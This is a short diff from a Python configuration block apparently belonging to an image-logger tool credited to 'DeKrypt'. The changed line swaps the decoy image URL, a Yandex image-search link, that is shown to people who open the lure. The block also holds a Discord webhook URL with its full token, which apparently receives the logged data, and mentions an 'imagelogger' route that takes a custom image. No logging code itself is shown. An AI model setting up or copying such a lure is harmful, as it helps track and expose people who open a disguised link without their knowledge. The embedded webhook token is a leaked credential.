@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1376453416095842375/yQ-DPR3t0tjNNG7MalTwF-3cU1firUGhwcUtBby4OtYNjiU62qfRDBYWrGehTxl5G1Yg",
-    "image": "https://yandex.ru/images/search?from=tabbar&img_url=https%3A%2F%2Fimage.lexica.art%2Ffull_jpg%2F7f3488c9-7ac5-4acd-821a-4b8b5f3bd0bd&lr=10335&pos=0&rpt=simage&text=bliss", # You can also have a custom image by using a URL argument
+    "image": "https://yandex.ru/images/search?from=tabbar&img_url=https%3A%2F%2Fae01.alicdn.com%2Fkf%2FHTB1t64QKFXXXXbYaXXXq6xXFXXXu%2FHigh-Spray-Sunset-View-Printed-Home-Decor-Art-Picture-Prairie-Scenery-Wall-Sticker-on-canvas.jpg&lr=10335&pos=2&rpt=simage&text=photos", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
